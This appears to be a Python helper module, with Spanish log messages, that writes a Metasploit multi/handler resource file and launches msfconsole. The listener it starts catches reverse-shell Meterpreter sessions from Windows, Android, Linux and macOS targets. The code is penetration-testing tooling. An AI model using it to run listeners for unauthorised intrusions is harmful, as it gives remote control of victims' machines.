import os
import time
import subprocess
import logging
import tempfile
import shlex
from pathlib import Path
from typing import Optional


class SecureHandlerManager:
    
    def __init__(self):
        self.setup_logging()
        self.allowed_payloads = {
            'windows/meterpreter/reverse_tcp',
            'windows/x64/meterpreter/reverse_https',
            'android/meterpreter/reverse_tcp',
            'android/meterpreter/reverse_https',
            'linux/x64/meterpreter/reverse_tcp',
            'python/meterpreter/reverse_tcp',
            'osx/x64/shell_reverse_https'
        }
    
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('handler.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def validate_ip(self, ip_address: str) -> bool:
        try:
            import ipaddress
            ipaddress.ip_address(ip_address)
            return True
        except ValueError:
            return False
    
    def validate_port(self, port: str) -> bool:
        try:
            port_num = int(port)
            return 1 <= port_num <= 65535
        except ValueError:
            return False
    
    def validate_payload(self, payload: str) -> bool:
        return payload in self.allowed_payloads
    
    def sanitize_input(self, user_input: str) -> str:
        dangerous_chars = ['&', '|', ';', '`', '$', '(', ')', '{', '}', '[', ']', '<', '>', '"', "'"]
        sanitized = str(user_input)
        for char in dangerous_chars:
            sanitized = sanitized.replace(char, '')
        return sanitized.strip()
    
    def create_handler_config(self, payload: str, lhost: str, lport: str) -> Optional[str]:
        try:
            sanitized_payload = self.sanitize_input(payload)
            sanitized_lhost = self.sanitize_input(lhost)
            sanitized_lport = self.sanitize_input(lport)
            
            if not self.validate_payload(sanitized_payload):
                self.logger.error(f"Payload no válido: {sanitized_payload}")
                return None
            
            if not self.validate_ip(sanitized_lhost):
                self.logger.error(f"IP no válida: {sanitized_lhost}")
                return None
            
            if not self.validate_port(sanitized_lport):
                self.logger.error(f"Puerto no válido: {sanitized_lport}")
                return None
            
            with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
                f.write("use exploit/multi/handler\n")
                f.write(f"set payload {sanitized_payload}\n")
                f.write(f"set LHOST {sanitized_lhost}\n")
                f.write(f"set LPORT {sanitized_lport}\n")
                f.write("set ExitOnSession false\n")
                f.write("exploit -j\n")
                
                config_file = f.name
            
            os.chmod(config_file, 0o600)
            self.logger.info(f"Archivo de configuración creado: {config_file}")
            return config_file
            
        except Exception as e:
            self.logger.error(f"Error creando configuración: {e}")
            return None
    
    def execute_msfconsole(self, config_file: str) -> bool:
        try:
            if not os.path.exists(config_file):
                self.logger.error(f"Archivo de configuración no encontrado: {config_file}")
                return False
            
            cmd = ["msfconsole", "-r", config_file]
            
            result = subprocess.run(
                cmd,
                timeout=None,
                check=False
            )
            
            self.logger.info(f"MSFConsole ejecutado con código de salida: {result.returncode}")
            return result.returncode == 0
            
        except subprocess.TimeoutExpired:
            self.logger.error("MSFConsole expiró por timeout")
            return False
        except FileNotFoundError:
            self.logger.error("MSFConsole no encontrado en el sistema")
            return False
        except Exception as e:
            self.logger.error(f"Error ejecutando MSFConsole: {e}")
            return False
        finally:
            self.cleanup_config_file(config_file)
    
    def cleanup_config_file(self, config_file: str):
        try:
            if os.path.exists(config_file):
                os.remove(config_file)
                self.logger.info(f"Archivo de configuración eliminado: {config_file}")
        except Exception as e:
            self.logger.warning(f"No se pudo eliminar archivo de configuración: {e}")
    
    def lanzar_handler_seguro(self, payload: str, lhost: str, lport: str) -> bool:
        try:
            print(f"\nCreando listener para: {payload}")
            
            config_file = self.create_handler_config(payload, lhost, lport)
            if not config_file:
                print("Error creando configuración del handler")
                return False
            
            time.sleep(1)
            
            success = self.execute_msfconsole(config_file)
            
            if success:
                self.logger.info(f"Handler lanzado exitosamente para {payload} en {lhost}:{lport}")
                print("Handler lanzado exitosamente")
            else:
                self.logger.error("Error lanzando handler")
                print("Error lanzando handler")
            
            return success
            
        except Exception as e:
            self.logger.error(f"Error en lanzar_handler_seguro: {e}")
            print("Error interno lanzando handler")
            return False


handler_manager = SecureHandlerManager()


def lanzar_handler(payload, lhost, lport):
    return handler_manager.lanzar_handler_seguro(payload, lhost, lport)